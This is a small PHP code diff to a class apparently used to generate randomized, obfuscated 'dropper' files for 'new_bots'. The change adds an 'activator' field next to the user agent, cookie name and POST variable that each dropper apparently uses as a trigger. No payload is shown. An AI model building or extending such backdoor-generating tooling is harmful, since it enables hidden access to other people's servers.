@@ -36,8 +36,6 @@ class slimDropper
         $this->random_uuid_var = substr($this->charset, rand(0, 15), rand(0, 5)) . bin2hex(openssl_random_pseudo_bytes(rand(1, 15)));
         $this->random_var = substr($this->charset, rand(0, 15), rand(0, 5)) . bin2hex(openssl_random_pseudo_bytes(rand(1, 15)));
         $this->random_var_second = substr($this->charset, rand(0, 15), rand(0, 5)) . bin2hex(openssl_random_pseudo_bytes(rand(1, 15)));
-
-
     }
 
     function generateDropper(): array
@@ -79,7 +77,8 @@ SLIMM;
                 "dropper" => "lib/new_bots/makeMeSlim/slimmed_droppers/$this->randomized_name",
                 "user_agent" => $this->user_agent,
                 "cookie_name" => $this->cookie_name,
-                "post_variable" => $this->post_variable
+                "post_variable" => $this->post_variable,
+                "activator" => $this->activator
             ];
         }
         return [];
